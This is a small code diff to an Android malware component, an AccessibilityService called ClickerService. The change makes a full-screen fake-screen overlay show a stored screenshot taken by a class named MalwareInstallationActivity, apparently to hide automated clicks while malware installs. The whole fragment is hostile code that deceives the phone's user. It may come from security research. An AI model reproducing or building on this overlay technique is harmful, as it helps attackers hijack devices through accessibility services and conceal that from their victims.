@@ -128,7 +128,10 @@ public class ClickerService extends AccessibilityService /*implements ServiceCon
 //        tvRedBar.setBackgroundColor(Color.BLACK);
 
         ImageView imageView = (ImageView) mRootView.findViewById(R.id.fake_screen);
-        imageView.setVisibility(View.VISIBLE);
+        if (MalwareInstallationActivity.mBitmapDrawableScreenshot != null) {
+            imageView.setImageDrawable(MalwareInstallationActivity.mBitmapDrawableScreenshot);
+            imageView.setVisibility(View.VISIBLE);
+        }
 
         WindowManager.LayoutParams params = (WindowManager.LayoutParams) mRootView.getLayoutParams();
         params.height = WindowManager.LayoutParams.MATCH_PARENT;
